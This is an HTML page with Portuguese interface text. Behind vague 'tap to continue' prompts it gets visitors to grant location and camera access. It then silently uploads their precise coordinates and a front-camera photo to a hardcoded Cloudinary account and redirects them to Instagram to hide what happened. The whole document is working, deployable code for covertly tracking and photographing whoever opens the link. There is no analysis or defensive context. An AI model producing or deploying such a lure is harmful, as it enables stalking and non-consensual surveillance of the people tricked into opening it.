<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Captura de Localização e Foto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #FFF; }
    #overlay {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex; justify-content: center; align-items: center;
      background: rgba(255,255,255,0.9);
      font-family: sans-serif; font-size: 20px; color: #333;
      text-align: center; padding: 20px; cursor: pointer; z-index:9999;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar</div>
  <script>
    const cloudName = 'dx5legahb';
    const uploadPreset = 'upload';
    const folderName = 'capturas';
    const overlay = document.getElementById('overlay');

    // Show overlay with message and click handler
    function show(msg, handler) {
      overlay.textContent = msg;
      overlay.style.display = 'flex';
      overlay.onclick = () => { overlay.style.display = 'none'; handler(); };
    }

    // Upload location to Cloudinary
    async function uploadLocation(lat, lon) {
      const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], {type: 'text/plain'});
      const form = new FormData();
      form.append('file', blob, `localizacao_${Date.now()}.txt`);
      form.append('upload_preset', uploadPreset);
      form.append('folder', folderName);
      await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form });
    }

    // Capture photo and upload
    async function capturePhoto() {
      const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:false});
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline','true'); video.setAttribute('autoplay',''); video.setAttribute('muted','');
      await new Promise(res => video.onloadedmetadata = res);
      video.play();
      await new Promise(r => setTimeout(r, 500));
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth; canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
      stream.getTracks().forEach(t=>t.stop());
      return new Promise((res,rej)=>{
        canvas.toBlob(async blob=>{
          const form = new FormData(); form.append('file', blob);
          form.append('upload_preset', uploadPreset); form.append('folder', folderName);
          const resp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {method:'POST',body:form});
          const data = await resp.json(); res(data.secure_url);
        }, 'image/png');
      });
    }

    // Step 1: request location
    function stepLocation() {
      if (!navigator.geolocation) return handleLocationError();
      navigator.geolocation.getCurrentPosition(async pos => {
        try {
          await uploadLocation(pos.coords.latitude, pos.coords.longitude);
          stepCamera();
        } catch(e) {
          console.error(e);
          show('Erro ao enviar localização. Tente novamente.', stepLocation);
        }
      }, () => {
        show('Toque para permitir a localização', stepLocation);
      }, {enableHighAccuracy:true, timeout:10000});
    }

    // Step 2: request camera and capture
    function stepCamera() {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return handleCameraError();
      show('Toque para permitir a câmera', async () => {
        try {
          const url = await capturePhoto();
          // opcional: log url
          window.location.href = 'https://instagram.com';
        } catch(e) {
          console.error(e);
          show('Permissão de câmera negada. Tente novamente.', stepCamera);
        }
      });
    }

    // Initial tap
    show('Toque para continuar', stepLocation);

    function handleLocationError() { show('Geolocalização não suportada', ()=>{});}  
    function handleCameraError() { show('Câmera não suportada', ()=>{});}  
  </script>
</body>
</html>
